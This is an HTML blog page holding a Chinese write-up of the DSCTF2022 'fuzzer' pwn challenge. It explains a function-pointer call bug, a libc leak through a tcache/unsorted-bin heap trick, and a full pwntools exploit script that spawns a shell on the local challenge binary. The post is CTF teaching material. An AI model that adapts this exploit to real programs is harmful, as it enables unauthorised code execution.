@@ -1,0 +1,668 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="h1J4cker">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目附件以及exp我已经上传到GitHub，有需要的可以自己去下载，这题比赛的时候是我队友出的，大佬们tql。 打开IDA Pro进行反汇编后阅读伪代码，这题逆向的过程并不难，所以就不讲了，漏洞也好找，静态分析后可以发现在1-5之外，还存在第六个选项。 点进6号选项调用的函数sub_E2B之后，可以发现，漏洞点就在如下位置：   这里读取了我们的输入，并把这个地址作为一个函数来执行，参数为我们输入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DSCTF2022 fuzzer-Wp">
+<meta property="og:url" content="http://example.com/2022/07/17/DSCTF2022%20fuzzer-Wp/index.html">
+<meta property="og:site_name" content="h1J4cker&#39;s Blog">
+<meta property="og:description" content="题目附件以及exp我已经上传到GitHub，有需要的可以自己去下载，这题比赛的时候是我队友出的，大佬们tql。 打开IDA Pro进行反汇编后阅读伪代码，这题逆向的过程并不难，所以就不讲了，漏洞也好找，静态分析后可以发现在1-5之外，还存在第六个选项。 点进6号选项调用的函数sub_E2B之后，可以发现，漏洞点就在如下位置：   这里读取了我们的输入，并把这个地址作为一个函数来执行，参数为我们输入">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/17/DSCTF2022%20fuzzer-Wp/vul.png">
+<meta property="article:published_time" content="2022-07-17T03:02:03.000Z">
+<meta property="article:modified_time" content="2022-07-17T03:07:43.308Z">
+<meta property="article:author" content="h1J4cker">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/07/17/DSCTF2022%20fuzzer-Wp/vul.png">
+  
+  
+  
+  <title>DSCTF2022 fuzzer-Wp - h1J4cker&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"SN0UPBBhNNKKecFHyvJx3G6c-MdYXbMMI","app_key":"kasQz2XsTxuX4MJ8VqqYSOun","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>h1J4cker</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DSCTF2022 fuzzer-Wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-17 11:02" pubdate>
+          July 17, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> times
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DSCTF2022 fuzzer-Wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目附件以及exp我已经上传到<a target="_blank" rel="noopener" href="https://github.com/Survive2/Fuzzer">GitHub</a>，有需要的可以自己去下载，这题比赛的时候是我队友出的，大佬们tql。</p>
+<p>打开IDA Pro进行反汇编后阅读伪代码，这题逆向的过程并不难，所以就不讲了，漏洞也好找，静态分析后可以发现在1-5之外，还存在第六个选项。</p>
+<p>点进6号选项调用的函数<code>sub_E2B</code>之后，可以发现，漏洞点就在如下位置：</p>
+<img src="/2022/07/17/DSCTF2022%20fuzzer-Wp/vul.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>这里读取了我们的输入，并把这个地址作为一个函数来执行，参数为我们输入的8个Index，那么该题的做法就是泄露地址，向chunk中写入<code>/bin/sh\x00</code>，并调用6号选项即可。</p>
+<p>这里再说一下地址怎么泄露，在队里大佬和我说了之后我才知道，<code>scanf</code>在读入换行符时默认是不会覆盖原本的内容的，也就是说可以输入<code> +\n</code>，这时fd指针会保存下来，那么我们在bitmap上，填上对应的值就好了。</p>
+<p>这里再简单说一下BitMap：</p>
+<p>BitMap是一种算法，在数据量特别大时，可以很好的缩减时间复杂度，通过在对应位置填上对应的值，来表明该位置代表的数字，是否存在。</p>
+<p>这题的BitMap的填法不能填0和1，因为这样不好泄露，在每个位置都填上这个位置的编号，就能很方便的泄露出libc。</p>
+<p>由于这题的libc版本是2.27的，存在tcache，题目限制了最多申请9个chunk，所以，申请9个并释放，填满tcache后，剩下的chunk由于大于fastbin的size，会进入unsorted bin，这样就可以通过该chunk的fd指针泄露出main_arena，从而计算得到libc，然后再计算出system的地址，并向chunk写入<code>/bin/sh\x00</code>即可getshell。</p>
+<p>最终exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from sgtpyutils.logger import logger</span><br><br>io=process(<span class="hljs-string">&#x27;./fuzzerinstrospector&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./fuzzerinstrospector&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">index,val,bit_map</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Your choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,val[i])<br>    io.recvuntil(<span class="hljs-string">&#x27;Bitmap: &#x27;</span>)<br>    io.sendline(bit_map)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,val,bit_map</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Your choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,val[i])<br>    io.recvuntil(<span class="hljs-string">&#x27;Bitmap: &#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        io.send(bit_map[i])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Your choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Your choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execve</span>(<span class="hljs-params">func_name</span>):<br>    io.recvuntil(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>)<br>    io.sendline(<span class="hljs-string">b&#x27;6&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(func_name))<br><br>bit1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">256</span><br>bit2=<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">256</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    create(<span class="hljs-number">8</span>-i,[<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>],bit2)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br><br><span class="hljs-comment">#puts_plt=elf.plt[&#x27;puts&#x27;]</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    delete(i)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br><br>bit_map=<span class="hljs-string">&quot; &quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    bit_map=<span class="hljs-built_in">chr</span>(<span class="hljs-number">0xff</span>-i)+bit_map<br><br><br><span class="hljs-comment">#bit_map=[&#x27;0&#x27;]*256</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    create(<span class="hljs-built_in">str</span>(i),[<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>],bit_map)<br><br>check(<span class="hljs-number">7</span>)<br><br>offset=<span class="hljs-number">624</span>+<span class="hljs-number">0x1ecb80</span><br><br>libc_base=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;Bit: &quot;</span>)<br>    tmp=io.recvline()<br>    tmp=<span class="hljs-built_in">int</span>(tmp)<br>    libc_base=libc_base+(tmp&lt;&lt;(i*<span class="hljs-number">8</span>))<br><br>libc_base=libc_base-offset<br><br><span class="hljs-comment">#print(&#x27;\n&#x27;)</span><br><br>success(<span class="hljs-string">&quot;\033[32m libc base is leaked! ==&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><br><span class="hljs-comment">#io.interactive()</span><br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br><br>sys_addr=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]+libc_base<br><br><br><br>success(<span class="hljs-string">&quot;\033[32m system address is calculated! ==&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(sys_addr) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment">#print(&#x27;\n&#x27;)</span><br><br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br><br>bit_map=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>    bit_map=bit_map+<span class="hljs-built_in">chr</span>(i)<br><br>create(<span class="hljs-number">0</span>,[<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;/&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;i&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;n&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;/&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;s&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;h&quot;</span>)),<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;\x00&quot;</span>))],bit_map)<br><br>execve(sys_addr)<br><br><br>io.interactive()<br><br><span class="hljs-comment">#gdb.attach(io)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>
+
+<p>后面还会写eznote，我比赛没做出来，队友出了，我去学习学习，大佬们tql。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-PWN/" class="category-chain-item">CTF-PWN</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DSCTF2022 fuzzer-Wp</div>
+      <div>http://example.com/2022/07/17/DSCTF2022 fuzzer-Wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>h1J4cker</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 17, 2022</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Licensed under</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/07/12/Nemu-Wp/" title="Nemu-Wp">
+                        <span class="hidden-mobile">Nemu-Wp</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Views: 
+        <span id="leancloud-site-pv"></span>
+        
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Visitors: 
+        <span id="leancloud-site-uv"></span>
+        
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
